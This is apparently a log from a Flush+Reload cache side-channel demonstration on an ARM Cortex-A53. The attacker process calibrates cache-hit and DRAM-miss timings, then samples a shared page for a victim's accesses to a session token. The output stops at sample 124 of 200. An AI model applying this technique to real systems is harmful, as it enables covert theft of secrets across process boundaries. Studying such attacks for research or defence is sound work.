╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffffabc54000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    135 ns  (line already in cache)
[attacker]   DRAM miss     =   2364 ns  (line not in cache)
[attacker]   Threshold     =   1249 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2031        miss      0 hits so far  (warmup)
  2       2239        miss      0 hits so far  (warmup)
  3       2604        miss      0 hits so far  (warmup)
  4       2760        miss      0 hits so far  (warmup)
  5       1510        miss      0 hits so far  (warmup)
  6       1406        miss      0 hits so far  (warmup)
  7       1718        miss      0 hits so far  (warmup)
  8       1406        miss      0 hits so far  (warmup)
  9       1562        miss      0 hits so far  (warmup)
  10      1354        miss      0 hits so far  (warmup)
  11      2395        miss      0 hits so far
  12      1250        miss      0 hits so far
  13      1927        miss      0 hits so far
  14      1354        miss      0 hits so far
  15      2135        miss      0 hits so far
  16      2083        miss      0 hits so far
  17      2291        miss      0 hits so far
  18      1770        miss      0 hits so far
  19      2395        miss      0 hits so far
  20      1770        miss      0 hits so far
  21      2187        miss      0 hits so far
  22      3020        miss      0 hits so far
  23      1875        miss      0 hits so far
  24      1927        miss      0 hits so far
  25      1718        miss      0 hits so far
  26      2187        miss      0 hits so far
  27      2187        miss      0 hits so far
  28      2031        miss      0 hits so far
  29      2083        miss      0 hits so far
  30      2083        miss      0 hits so far
  31      2031        miss      0 hits so far
  32      2239        miss      0 hits so far
  33      1770        miss      0 hits so far
  34      2343        miss      0 hits so far
  35      2291        miss      0 hits so far
  36      2135        miss      0 hits so far
  37      1666        miss      0 hits so far
  38      1979        miss      0 hits so far
  39      2031        miss      0 hits so far
  40      1927        miss      0 hits so far
  41      1770        miss      0 hits so far
  42      1927        miss      0 hits so far
  43      3125        miss      0 hits so far
  44      2708        miss      0 hits so far
  45      2343        miss      0 hits so far
  46      2135        miss      0 hits so far
  47      2187        miss      0 hits so far
  48      1822        miss      0 hits so far
  49      2187        miss      0 hits so far
  50      1979        miss      0 hits so far
  51      989         HIT ◄   1 hits so far
  52      2552        miss      1 hits so far
  53      1614        miss      1 hits so far
  54      1718        miss      1 hits so far
  55      1197        HIT ◄   2 hits so far
  56      1093        HIT ◄   3 hits so far
  57      1458        miss      3 hits so far
  58      1927        miss      3 hits so far
  59      989         HIT ◄   4 hits so far
  60      2708        miss      4 hits so far
  61      2239        miss      4 hits so far
  62      1302        miss      4 hits so far
  63      1718        miss      4 hits so far
  64      2656        miss      4 hits so far
  65      1927        miss      4 hits so far
  66      1979        miss      4 hits so far
  67      1406        miss      4 hits so far
  68      2552        miss      4 hits so far
  69      2343        miss      4 hits so far
  70      2291        miss      4 hits so far
  71      1354        miss      4 hits so far
  72      2864        miss      4 hits so far
  73      1562        miss      4 hits so far
  74      1093        HIT ◄   5 hits so far
  75      1562        miss      5 hits so far
  76      2395        miss      5 hits so far
  77      989         HIT ◄   6 hits so far
  78      1406        miss      6 hits so far
  79      2343        miss      6 hits so far
  80      2343        miss      6 hits so far
  81      2604        miss      6 hits so far
  82      3385        miss      6 hits so far
  83      1770        miss      6 hits so far
  84      1510        miss      6 hits so far
  85      1406        miss      6 hits so far
  86      937         HIT ◄   7 hits so far
  87      3020        miss      7 hits so far
  88      1197        HIT ◄   8 hits so far
  89      1614        miss      8 hits so far
  90      1093        HIT ◄   9 hits so far
  91      2187        miss      9 hits so far
  92      1458        miss      9 hits so far
  93      1614        miss      9 hits so far
  94      1406        miss      9 hits so far
  95      729         HIT ◄   10 hits so far
  96      2447        miss      10 hits so far
  97      1250        miss      10 hits so far
  98      937         HIT ◄   11 hits so far
  99      1041        HIT ◄   12 hits so far
  100     2187        miss      12 hits so far
  101     1927        miss      12 hits so far
  102     1302        miss      12 hits so far
  103     1041        HIT ◄   13 hits so far
  104     2760        miss      13 hits so far
  105     1822        miss      13 hits so far
  106     1927        miss      13 hits so far
  107     1822        miss      13 hits so far
  108     2291        miss      13 hits so far
  109     2708        miss      13 hits so far
  110     3541        miss      13 hits so far
  111     989         HIT ◄   14 hits so far
  112     2395        miss      14 hits so far
  113     2395        miss      14 hits so far
  114     2864        miss      14 hits so far
  115     2135        miss      14 hits so far
  116     1822        miss      14 hits so far
  117     2135        miss      14 hits so far
  118     1770        miss      14 hits so far
  119     1770        miss      14 hits so far
  120     2395        miss      14 hits so far
  121     2239        miss      14 hits so far
  122     2239        miss      14 hits so far
  123     2447        miss      14 hits so far
  124     1614        miss      14 hits so far
